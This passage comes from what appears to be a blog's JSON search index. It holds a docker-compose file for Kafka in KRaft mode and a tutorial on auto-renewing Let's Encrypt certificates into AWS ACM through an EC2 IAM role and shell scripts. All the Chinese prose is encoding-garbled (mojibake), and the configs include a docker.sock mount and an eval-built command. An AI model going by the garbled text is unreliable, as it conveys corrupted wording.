class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    container_name: kafka\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - 9092:9092\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - 9093:9093\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_KRAFT_MODE: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# This enables KRaft mode in Kafka.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_PROCESS_ROLES: controller,broker  \u003cspan class=\"c1\"\u003e# Kafka acts as both broker and controller.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_NODE_ID: \u003cspan class=\"m\"\u003e1\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# A unique ID for this Kafka instance.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_CONTROLLER_QUORUM_VOTERS: 1@10.8.1.119:9093  \u003cspan class=\"c1\"\u003e# Defines the controller voters.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_LISTENERS: PLAINTEXT://0.0.0.0:9092,CONTROLLER://0.0.0.0:9093\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: PLAINTEXT:PLAINTEXT,CONTROLLER:PLAINTEXT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_INTER_BROKER_LISTENER_NAME: PLAINTEXT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_CONTROLLER_LISTENER_NAMES: CONTROLLER\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://10.8.1.119:9092\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_LOG_DIRS: /var/lib/kafka/data  \u003cspan class=\"c1\"\u003e# Where Kafka stores its logs.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_AUTO_CREATE_TOPICS_ENABLE: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# Kafka will automatically create topics if needed.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: \u003cspan class=\"m\"\u003e1\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# Since weâ€™re running one broker, one replica is enough.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_LOG_RETENTION_HOURS: \u003cspan class=\"m\"\u003e168\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# Keep logs for 7 days.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      KAFKA_GROUP_INITIAL_REBALANCE_DELAY_MS: \u003cspan class=\"m\"\u003e0\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# No delay for consumer rebalancing.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      CLUSTER_ID: Mk3OEYBSD34fcwNTJENDM2Qk  \u003cspan class=\"c1\"\u003e# A unique ID for the Kafka cluster.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    volumes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - /var/run/docker.sock:/var/run/docker.sock\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - ./data:/var/lib/kafka/data  \u003cspan class=\"c1\"\u003e# Store Kafka logs on your local machine.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ä»¥ä¸Šçš„æ–‡ä»¶ï¼Œæš´éœ²äº†2ä¸ªç«¯å£ï¼Œ9092å’Œ9093ï¼Œ9092ç”¨äºå®¢æˆ·ç«¯è¿æ¥ï¼Œ9093ç”¨äºé›†ç¾¤é€šè®¯ï¼›\u003ccode\u003eKAFKA_KRAFT_MODE: true\u003c/code\u003eç”¨kraftä¸ç”¨zk. ClUSTER_IDå¯ä»¥æ¢ä¸ªä¸åŒçš„ã€‚\u003c/p\u003e","title":"ç”¨Dockeréƒ¨ç½²kafkaä¸”ä¸ä¾èµ–zookeeper"},{"content":"äº¤ä»£ä¸€ä¸‹èƒŒæ™¯ï¼š\nå…¬å¸åœ¨AWSä¸Šç”¨çš„æ˜¯EKS+Fargateï¼Œè¿˜æœ‰ä¸€ä¸ªè·³æ¿æœºï¼Œè¯ä¹¦å‘¢å°±ä¸å¤ªæƒ³ç”¨awsæ”¶è´¹çš„äº†ï¼Œå¹²è„†ç”¨å…è´¹çš„è¯ä¹¦å¥½äº†ã€‚\né‚£é—®é¢˜å°±æ¥äº†ï¼ŒLetâ€˜s encryptçš„è¯ä¹¦90å¤©åˆ°æœŸï¼Œå·²ç»æ‰‹åŠ¨æ›´æ–°è¿‡3æ¬¡äº†ï¼Œå®åœ¨å¤ªéº»çƒ¦äº†ï¼Œèƒ½ä¸èƒ½è‡ªåŠ¨ç”³è¯·å¹¶æ›´æ–°åˆ°ACMå‘¢ï¼Ÿ\nç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼ŒåŸç†æ˜¯ï¼šåˆ©ç”¨EC2å¯ä»¥æºå¸¦IAMè§’è‰²çš„åŸç†ï¼Œå°±å¯ä»¥æ— å‡­è¯æ›´æ–°å…è´¹è¯ä¹¦åˆ°AWS Certificate Manageräº†\nåšæ³•å¦‚ä¸‹ï¼š\nä¸€ã€é¦–å…ˆå»ACMä¸­æ‹¿åˆ°è¯ä¹¦çš„ARNï¼Œè¦ç¡®ä¿IAMæƒé™ä¸å¤–æ³„ï¼Œé¿å…æ›´æ–°é”™è¯ä¹¦\näºŒã€ç”Ÿæˆä¸€ä¸ªIAMçš„policyï¼Œå‘½åä¸ºAllowUpdateCertificateï¼Œåªå…è®¸æ›´æ–°è¿™ä¸¤ä¸ªç‰¹å®šçš„è¯ä¹¦\nå…·ä½“ç­–ç•¥å†…å®¹å¦‚ä¸‹ï¼š\n{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;acm:ImportCertificate\u0026#34; ], \u0026#34;Resource\u0026#34;: [ \u0026#34;arn:aws:acm:ap-southeast-1:111111111111:certificate/arn01\u0026#34;, \u0026#34;arn:aws:acm:ap-southeast-1:111111111111:certificate/arn02\u0026#34; ] } ] } ä¸‰ã€IAMç”Ÿæˆä¸€ä¸ªroleè§’è‰²ï¼Œå‘½åä¸ºEc2UpdateCertificateRoleï¼ŒæŠŠAllowUpdateCertificateç­–ç•¥ç»™é™„ä¸Š\nå››ã€åˆ°EC2çš„å®ä¾‹è¯¦ç»†ä¿¡æ¯ä¸­ï¼Œæ“ä½œ\u0026ndash;\u0026gt;å®‰å…¨\u0026ndash;\u0026gt;ä¿®æ”¹IAMè§’è‰²\né™„ä¸ŠEc2UpdateCertificateRoleè¿™ä¸ªè§’è‰²\näº”ã€åœ¨EC2çš„æœºå™¨ä¸Šï¼Œè£…å¥½AWS CLIï¼Œè¿˜æœ‰lego(ç”³è¯·Let\u0026rsquo;s encryptè¯ä¹¦çš„è½¯ä»¶)\nå…ˆå†™å¥½è·å¾—è¯ä¹¦çš„è„šæœ¬ get_cert.shï¼ŒåŸŸåDNSè§£ææ˜¯æ‰˜ç®¡åˆ°cloudflareçš„ï¼Œæ‰€ä»¥ä¹Ÿç›´æ¥ç”¨API TOKENæ¥å¤„ç†\n#!/bin/bash CLOUDFLARE_DNS_API_TOKEN=######## /usr/local/bin/lego --path /usr/local/bin/certs --email zhangranrui@rendoumi.com --dns cloudflare --domains *.rendoumi.com --domains rendoumi.com renew --renew-hook=\u0026#34;/usr/local/bin/update_aws_cert.sh\u0026#34; å‚æ•°--renew-hookå¦‚æœæœ‰æ–°è¯ä¹¦ï¼Œå°±è°ƒç”¨åé¢çš„è„šæœ¬ã€‚å¦‚æœæ²¡æœ‰æ–°è¯ä¹¦ï¼Œå°±æ— æ“ä½œï¼Œé¿å…æ— ç”¨åŠŸã€‚\nç„¶åå†å†™å¥½ update_aws_cert.shï¼Œè¿™å°±æ˜¯ä¸ªåƒå­—æ–‡äº†ï¼Œç”±geminiç”Ÿæˆçš„ï¼š\nç”±äºlegoç”Ÿæˆçš„crtæ˜¯è¯ä¹¦+è¯ä¹¦é“¾ï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥è¦æŠŠè¯ä¹¦éƒ¨åˆ†ç»™å•ç‹¬æ‹†å‡ºæ¥\n#!/bin/bash cd /usr/local/bin/certs/certificates #é¦–å…ˆæŠŠè¯ä¹¦å•ç‹¬æ‹†å‡ºæ¥ awk \u0026#39;/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/ {print} /-----END CERTIFICATE-----/ {exit}\u0026#39; _.rendoumi.com.crt \u0026gt; _.rendoumi.com.only # --- é…ç½®éƒ¨åˆ† --- # æ‚¨è¦æ›´æ–°çš„ç°æœ‰ ACM è¯ä¹¦çš„ ARN # ç¤ºä¾‹ï¼šCERTIFICATE_ARN=\u0026#34;arn:aws:acm:ap-southeast-1:123456789012:certificate/abcdefab-1234-5678-abcd-1234567890ab\u0026#34; CERTIFICATE_ARN=\u0026#34;arn:aws:acm:ap-southeast-1:111111111111:certificate/11111111-1111-1111-1111-111111111111\u0026#34; # æ–°è¯ä¹¦æ–‡ä»¶çš„è·¯å¾„ï¼ˆä¾‹å¦‚ï¼š/opt/certs/new_certificate.crtï¼‰ # ç¡®ä¿è¿™ä¸ªè·¯å¾„åœ¨æ‚¨çš„EC2å®ä¾‹ä¸Šæ˜¯æ­£ç¡®çš„ CERTIFICATE_BODY_PATH=\u0026#34;_.rendoumi.com.only\u0026#34; # æ–°ç§é’¥æ–‡ä»¶çš„è·¯å¾„ï¼ˆä¾‹å¦‚ï¼š/opt/certs/private.keyï¼‰ # ç¡®ä¿è¿™ä¸ªè·¯å¾„åœ¨æ‚¨çš„EC2å®ä¾‹ä¸Šæ˜¯æ­£ç¡®çš„ PRIVATE_KEY_PATH=\u0026#34;_.rendoumi.com.key\u0026#34; # è¯ä¹¦é“¾æ–‡ä»¶çš„è·¯å¾„ï¼ˆå¯é€‰ï¼‰ # å¦‚æœæ²¡æœ‰è¯ä¹¦é“¾ï¼Œè¯·å°†æ­¤å˜é‡ç•™ç©ºæˆ–æ³¨é‡Šæ‰ # ç¤ºä¾‹ï¼šCERTIFICATE_CHAIN_PATH=\u0026#34;/opt/certs/ca_bundle.crt\u0026#34; CERTIFICATE_CHAIN_PATH=\u0026#34;_.rendoumi.com.issuer.crt\u0026#34; # å¦‚æœæ²¡æœ‰é“¾ï¼Œè¯·å°†å…¶ç•™ç©º \u0026#34;\u0026#34; # ACM è¯ä¹¦æ‰€åœ¨çš„ AWS åŒºåŸŸ # è¿™ä¸ªåŒºåŸŸåº”è¯¥ä¸ CERTIFICATE_ARN ä¸­çš„åŒºåŸŸåŒ¹é… # ç¤ºä¾‹ï¼šAWS_REGION=\u0026#34;ap-southeast-1\u0026#34; AWS_REGION=\u0026#34;ap-southeast-1\u0026#34; # --- é…ç½®éƒ¨åˆ†ç»“æŸ --- echo \u0026#34;--- å¼€å§‹ä½¿ç”¨å®ä¾‹è§’è‰²é‡æ–°å¯¼å…¥ ACM è¯ä¹¦ ---\u0026#34; echo \u0026#34;è¯ä¹¦ ARN: ${CERTIFICATE_ARN}\u0026#34; echo \u0026#34;åŒºåŸŸ: ${AWS_REGION}\u0026#34; # æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ if [ ! -f \u0026#34;${CERTIFICATE_BODY_PATH}\u0026#34; ]; then echo \u0026#34;é”™è¯¯ï¼šè¯ä¹¦æ–‡ä»¶ \u0026#39;${CERTIFICATE_BODY_PATH}\u0026#39; ä¸å­˜åœ¨ã€‚\u0026#34; exit 1 fi if [ ! -f \u0026#34;${PRIVATE_KEY_PATH}\u0026#34; ]; then echo \u0026#34;é”™è¯¯ï¼šç§é’¥æ–‡ä»¶ \u0026#39;${PRIVATE_KEY_PATH}\u0026#39; ä¸å­˜åœ¨ã€‚\u0026#34; exit 1 fi if [ -n \u0026#34;${CERTIFICATE_CHAIN_PATH}\u0026#34; ] \u0026amp;\u0026amp; [ ! -f \u0026#34;${CERTIFICATE_CHAIN_PATH}\u0026#34; ]; then echo \u0026#34;è­¦å‘Šï¼šè¯ä¹¦é“¾æ–‡ä»¶ \u0026#39;${CERTIFICATE_CHAIN_PATH}\u0026#39; å·²æŒ‡å®šä½†ä¸å­˜åœ¨ã€‚å°†ä¸åŒ…å«è¯ä¹¦é“¾è¿›è¡Œå¯¼å…¥ã€‚\u0026#34; CERTIFICATE_CHAIN_PATH=\u0026#34;\u0026#34; # å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™æ¸…ç©ºè·¯å¾„ fi # æ„é€  AWS CLI å‘½ä»¤ã€‚AWS CLI ä¼šè‡ªåŠ¨ä½¿ç”¨å®ä¾‹è§’è‰²æä¾›çš„å‡­è¯ã€‚ IMPORT_CMD=\u0026#34;aws acm import-certificate \\ --certificate-arn ${CERTIFICATE_ARN} \\ --certificate fileb://${CERTIFICATE_BODY_PATH} \\ --private-key fileb://${PRIVATE_KEY_PATH} \\ --region \\\u0026#34;${AWS_REGION}\\\u0026#34;\u0026#34; # å¦‚æœæœ‰è¯ä¹¦é“¾ï¼Œåˆ™æ·»åŠ åˆ°å‘½ä»¤ä¸­ if [ -n \u0026#34;${CERTIFICATE_CHAIN_PATH}\u0026#34; ]; then IMPORT_CMD=\u0026#34;${IMPORT_CMD} --certificate-chain fileb://${CERTIFICATE_CHAIN_PATH}\u0026#34; fi echo \u0026#34;æ­£åœ¨æ‰§è¡Œå‘½ä»¤ï¼š\u0026#34; echo \u0026#34;$IMPORT_CMD\u0026#34; echo \u0026#34;--------------------------\u0026#34; # æ‰§è¡Œå‘½ä»¤ # æ³¨æ„ï¼šè¿™é‡Œæˆ‘ä»¬ä¸æŒ‡å®š --profile æˆ–ä»»ä½•å‡­è¯ï¼ŒAWS CLI ä¼šè‡ªåŠ¨ä½¿ç”¨å®ä¾‹IAMè§’è‰²ã€‚ eval $IMPORT_CMD # æ£€æŸ¥å‘½ä»¤æ‰§è¡Œç»“æœ if [ $? -eq 0 ]; then echo \u0026#34;--- è¯ä¹¦é‡æ–°å¯¼å…¥æˆåŠŸï¼---\u0026#34; echo \u0026#34;ACM è¯ä¹¦ ${CERTIFICATE_ARN} å·²æ›´æ–°ã€‚\u0026#34; else echo \u0026#34;--- è¯ä¹¦é‡æ–°å¯¼å…¥å¤±è´¥ï¼---\u0026#34; echo \u0026#34;è¯·æ£€æŸ¥é”™è¯¯æ¶ˆæ¯ï¼Œç¡®ä¿ï¼š\u0026#34; echo \u0026#34;1. EC2 å®ä¾‹å·²æ­£ç¡®é™„åŠ äº†å…·æœ‰ acm:ImportCertificate æƒé™çš„ IAM è§’è‰²ã€‚\u0026#34; echo \u0026#34;2. è¯ä¹¦ã€ç§é’¥å’Œé“¾æ–‡ä»¶è·¯å¾„æ­£ç¡®ä¸”å¯è¯»ã€‚\u0026#34; echo \u0026#34;3. è¯ä¹¦/ç§é’¥/é“¾çš„æ ¼å¼æ­£ç¡®ã€‚\u0026#34; fi echo \u0026#34;--- è„šæœ¬æ‰§è¡Œå®Œæ¯• ---\u0026#34; çœ‹èµ·æ¥çœŸçš„æ˜¯åˆè‡­åˆé•¿ï¼ŒåºŸè¯è¿ç¯‡ã€‚æ³¨æ„ï¼šgemini ç”Ÿæˆçš„ä»£ç æœ‰é—®é¢˜ï¼Œaws acm import-certificate çš„å‚æ•°ä¸­ï¼Œè¯ä¹¦æ–‡ä»¶çš„å‰ç¼€æ˜¯fileb://ï¼Œgeminiç»™çš„æ˜¯file://ï¼Œè°ƒè¯•äº†åŠå¤©ï¼Œæœ€åå»awsçœ‹äº†æ–‡æ¡£æ‰å‘ç°ã€‚\nå¦‚ä¸Šæ“ä½œï¼Œè„šæœ¬æ”¾å…¥åˆ°crontbä¸­ï¼Œæ²¡æœ‰ç”¨åˆ°ä»»ä½•aws access idå’Œsecretï¼Œå°±èƒ½æ­£ç¡®æ›´æ–°è¯ä¹¦ï¼Œå–„è«å¤§ç„‰ã€‚\n","permalink":"https://rendoumi.com/posts/20250725-aws_route53_update_certificate/","summary":"\u003cp\u003eäº¤ä»£ä¸€ä¸‹èƒŒæ™¯ï¼š\u003c/p\u003e\n\u003cp\u003eå…¬å¸åœ¨AWSä¸Šç”¨çš„æ˜¯EKS+Fargateï¼Œè¿˜æœ‰ä¸€ä¸ªè·³æ¿æœºï¼Œè¯ä¹¦å‘¢å°±ä¸å¤ªæƒ³ç”¨awsæ”¶è´¹çš„äº†ï¼Œå¹²è„†ç”¨å…è´¹çš„è¯ä¹¦å¥½äº†ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£é—®é¢˜å°±æ¥äº†ï¼ŒLetâ€˜s encryptçš„è¯ä¹¦90å¤©åˆ°æœŸï¼Œå·²ç»æ‰‹åŠ¨æ›´æ–°è¿‡3æ¬¡äº†ï¼Œå®åœ¨å¤ªéº»çƒ¦äº†ï¼Œèƒ½ä¸èƒ½è‡ªåŠ¨ç”³è¯·å¹¶æ›´æ–°åˆ°ACMå‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼ŒåŸç†æ˜¯ï¼šåˆ©ç”¨EC2å¯ä»¥æºå¸¦IAMè§’è‰²çš„åŸç†ï¼Œå°±å¯ä»¥æ— å‡­è¯æ›´æ–°å…è´¹è¯ä¹¦åˆ°AWS Certificate Manageräº†\u003c/p\u003e\n\u003cp\u003eåšæ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eä¸€ã€é¦–å…ˆå»ACMä¸­æ‹¿åˆ°è¯ä¹¦çš„ARNï¼Œè¦ç¡®ä¿IAMæƒé™ä¸å¤–æ³„ï¼Œé¿å…æ›´æ–°é”™è¯ä¹¦\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250725144718592\" loading=\"lazy\" src=\"/posts/20250725-aws_route53_update_certificate/image-20250725144718592.png\"\u003e\u003c/p\u003e\n\u003cp\u003eäºŒã€ç”Ÿæˆä¸€ä¸ªIAMçš„policyï¼Œå‘½åä¸º\u003ccode\u003eAllowUpdateCertificate\u003c/code\u003eï¼Œåªå…è®¸æ›´æ–°è¿™ä¸¤ä¸ªç‰¹å®šçš„è¯ä¹¦\u003c/p\u003e\n\u003cp\u003eå…·ä½“ç­–ç•¥å†…å®¹å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"s2\"\u003e\u0026#34;Version\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;2012-10-17\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"s2\"\u003e\u0026#34;Statement\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"s2\"\u003e\u0026#34;Effect\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Allow\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"s2\"\u003e\u0026#34;Action\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"s2\"\u003e\u0026#34;acm:ImportCertificate\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"o\"\u003e]\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"s2\"\u003e\u0026#34;Resource\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"s2\"\u003e\u0026#34;arn:aws:acm:ap-southeast-1:111111111111:certificate/arn01\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"s2\"\u003e\u0026#34;arn:aws:acm:ap-southeast-1:111111111111:certificate/arn02\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20250725145030921\" loading=\"lazy\" src=\"/posts/20250725-aws_route53_update_certificate/image-20250725145030921.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¸‰ã€IAMç”Ÿæˆä¸€ä¸ªroleè§’è‰²ï¼Œå‘½åä¸º\u003ccode\u003eEc2UpdateCertificateRole\u003c/code\u003eï¼ŒæŠŠ\u003ccode\u003eAllowUpdateCertificate\u003c/code\u003eç­–ç•¥ç»™é™„ä¸Š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250725145132762\" loading=\"lazy\" src=\"/posts/20250725-aws_route53_update_certificate/image-20250725145132762.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå››ã€åˆ°EC2çš„å®ä¾‹è¯¦ç»†ä¿¡æ¯ä¸­ï¼Œæ“ä½œ\u0026ndash;\u0026gt;å®‰å…¨\u0026ndash;\u0026gt;ä¿®æ”¹IAMè§’è‰²\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250725145419632\" loading=\"lazy\" src=\"/posts/20250725-aws_route53_update_certificate/image-20250725145419632.png\"\u003e\u003c/p\u003e\n\u003cp\u003eé™„ä¸Š\u003ccode\u003eEc2UpdateCertificateRole\u003c/code\u003eè¿™ä¸ªè§’è‰²\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250725145533303\" loading=\"lazy\" src=\"/posts/20250725-aws_route53_update_certificate/image-20250725145533303.png\"\u003e\u003c/p\u003e\n\u003cp\u003eäº”ã€åœ¨EC2çš„æœºå™¨ä¸Šï¼Œè£…å¥½AWS CLIï¼Œè¿˜æœ‰lego(ç”³è¯·Let\u0026rsquo;s encryptè¯ä¹¦çš„è½¯ä»¶)\u003c/p\u003e\n\u003cp\u003eå…ˆå†™å¥½è·å¾—è¯ä¹¦çš„è„šæœ¬ get_cert.shï¼ŒåŸŸåDNSè§£ææ˜¯æ‰˜ç®¡åˆ°cloudflareçš„ï¼Œæ‰€ä»¥ä¹Ÿç›´æ¥ç”¨API TOKENæ¥å¤„ç†\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eCLOUDFLARE_DNS_API_TOKEN\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"c1\"\u003e######## /usr/local/bin/lego --path /usr/local/bin/certs --email zhangranrui@rendoumi.com --dns cloudflare --domains *.rendoumi.com --domains rendoumi.com renew --renew-hook=\u0026#34;/usr/local/bin/update_aws_cert.sh\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå‚æ•°\u003ccode\u003e--renew-hook\u003c/code\u003eå¦‚æœæœ‰æ–°è¯ä¹¦ï¼Œå°±è°ƒç”¨åé¢çš„è„šæœ¬ã€‚å¦‚æœæ²¡æœ‰æ–°è¯ä¹¦ï¼Œå°±æ— æ“ä½œï¼Œé¿å…æ— ç”¨åŠŸã€‚\u003c/p\u003e\n\u003cp\u003eç„¶åå†å†™å¥½ update_aws_cert.shï¼Œè¿™å°±æ˜¯ä¸ªåƒå­—æ–‡äº†ï¼Œç”±geminiç”Ÿæˆçš„ï¼š\u003c/p\u003e\n\u003cp\u003eç”±äºlegoç”Ÿæˆçš„crtæ˜¯è¯ä¹¦+è¯ä¹¦é“¾ï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥è¦æŠŠè¯ä¹¦éƒ¨åˆ†ç»™å•ç‹¬æ‹†å‡ºæ¥\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /usr/local/bin/certs/certificates\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#é¦–å…ˆæŠŠè¯ä¹¦å•ç‹¬æ‹†å‡ºæ¥\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eawk \u003cspan class=\"s1\"\u003e\u0026#39;/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/ {print} /-----END CERTIFICATE-----/ {exit}\u0026#39;\u003c/span\u003e _.rendoumi.com.crt \u0026gt; _.rendoumi.com.only\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 